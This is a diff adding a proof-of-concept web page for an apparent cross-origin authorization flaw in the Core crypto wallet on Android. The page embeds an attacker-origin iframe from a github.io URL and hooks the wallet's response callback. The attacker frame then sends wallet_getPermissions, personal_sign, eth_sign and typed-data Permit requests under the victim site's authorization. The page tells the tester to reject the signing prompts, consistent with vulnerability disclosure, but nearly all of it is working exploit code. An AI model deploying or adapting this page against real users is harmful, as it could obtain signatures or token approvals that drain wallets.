@@ -1,0 +1,78 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Core Android cross-origin authorization PoC</title>
+<style>
+html,body{background:#fff;color:#111}body{max-width:720px;margin:24px auto;padding:0 18px;font:17px/1.5 system-ui}button{display:block;width:100%;margin:9px 0;padding:14px;background:#fff;color:#111;border:2px solid #111;border-radius:6px;text-align:left;font:700 16px system-ui}button:disabled{color:#777;border-color:#aaa}.valid{padding:13px;border:3px solid #b00020;color:#8b0018;font-weight:800}pre{padding:14px;border:2px solid #555;font:14px/1.45 ui-monospace,monospace;white-space:pre-wrap;overflow-wrap:anywhere}iframe{width:100%;height:72px;border:2px solid #555}
+</style>
+<h2>=Cross origin authorization</h2>
+<p>Victim A: <b id="a"></b><br>Attacker B: <b id="b"></b></p>
+<p>Reject every signing request.</p>
+<button id="connect">1. Connect Origin A</button>
+<button id="permissions" disabled>2. B invokes wallet_getPermissions as A</button>
+<button id="personal" disabled>3. B invokes personal_sign as A -> REJECT</button>
+<button id="blind" disabled>4. B invokes eth_sign as A -> REJECT</button>
+<button id="permit" disabled>5. B invokes dummy Permit as A -> REJECT</button>
+<p id="verdict" class="valid" hidden></p>
+<pre id="log">load...</pre>
+<iframe id="frame"></iframe>
+<script>
+'use strict';
+const ATTACKER='https://azza1231.github.io/pocpoc/attacker-adrd.html';
+const IDS={permissions:833731,personal:833732,blind:833733,permit:833734};
+const $=id=>document.getElementById(id),frame=$('frame'),bOrigin=new URL(ATTACKER).origin,pending=new Map();
+let account='',chainId='',ready=false,permission=false;
+$('a').textContent=location.origin;$('b').textContent=bOrigin;
+const write=value=>$('log').textContent+='\n'+value;
+const verdict=value=>{$('verdict').hidden=false;$('verdict').textContent=value};
+const isAddress=value=>/^0x[0-9a-fA-F]{40}$/.test(value);
+const granted=result=>Array.isArray(result)?result.flatMap(p=>Array.isArray(p?.caveats)?p.caveats.flatMap(c=>c?.type==='restrictReturnedAccounts'&&Array.isArray(c.value)?c.value:[]):[]):[];
+
+function observe(){
+  if(window.__coreAndroidObserver)return true;
+  if(typeof window.__coreProviderRespond!=='function'){write('ERROR: Core callback unavailable');return false}
+  const original=window.__coreProviderRespond;
+  window.__coreProviderRespond=function(id,error,result){
+    const req=pending.get(id);
+    if(req){
+      write(`\nCORE RESPONSE ${req.method}\n${JSON.stringify({id,error,result},null,2)}`);
+      if(id===IDS.permissions&&!error&&granted(result).some(x=>x.toLowerCase()===account.toLowerCase())){
+        permission=true;$('personal').disabled=$('blind').disabled=$('permit').disabled=false;
+        verdict('VALID: Android cross-origin B reused Origin A authorization.');
+      }else if(error?.code===4001||/reject|cancel/i.test(error?.message||'')){
+        verdict(`VALID: Core admitted B's ${req.method} request as A; tester rejected it.`);
+      }else if(!error)verdict(`STOP: ${req.method} was approved. Do not use its result.`);
+      pending.delete(id);
+    }
+    return original.apply(this,arguments);
+  };
+  window.__coreAndroidObserver=true;
+  return true;
+}
+
+function send(type,id,method){
+  if(!ready||!observe())return;
+  pending.set(id,{method});
+  write(`\nB SENDS ${method}\nactual B: ${bOrigin}\nclaimed A: ${location.origin}`);
+  frame.contentWindow.postMessage({type,id,account,chainId},bOrigin);
+}
+
+addEventListener('message',event=>{
+  if(event.source!==frame.contentWindow||event.origin!==bOrigin)return;
+  const data=event.data||{};
+  if(data.type==='READY'){
+    ready=data.actualOrigin===bOrigin&&data.victimOrigin===location.origin&&data.isSubframe===true&&data.bridgeVisible===true;
+    $('permissions').disabled=!(ready&&isAddress(account));
+    $('log').textContent=`Browser-authenticated B: ${event.origin}\nVictim A: ${location.origin}\nCross-origin subframe: ${data.isSubframe}\nAndroid bridge in B: ${data.bridgeVisible}\nStrict proof: ${ready}`;
+  }
+  if(data.type==='SENT')write(`B BRIDGE CALL\n${JSON.stringify(data.proof,null,2)}`);
+  if(data.type==='ERROR'){pending.delete(data.id);write('ERROR: '+data.message)}
+});
+
+const child=new URL(ATTACKER);child.searchParams.set('victimOrigin',location.origin);child.searchParams.set('v',Date.now());frame.src=child.href;
+$('connect').onclick=async()=>{try{const accounts=await ethereum.request({method:'eth_requestAccounts'});account=accounts?.[0]||'';chainId=await ethereum.request({method:'eth_chainId'});if(!isAddress(account))throw Error('No account');write(`\nA CONNECTED\naccount: ${account}\nchainId: ${chainId}`);$('connect').disabled=true;$('permissions').disabled=!ready}catch(error){write('CONNECT ERROR: '+(error?.message||error))}};
+$('permissions').onclick=()=>send('PERMISSIONS',IDS.permissions,'wallet_getPermissions');
+$('personal').onclick=()=>permission&&send('PERSONAL',IDS.personal,'personal_sign');
+$('blind').onclick=()=>permission&&send('BLIND',IDS.blind,'eth_sign');
+$('permit').onclick=()=>permission&&send('PERMIT',IDS.permit,'eth_signTypedData_v4');
+</script>
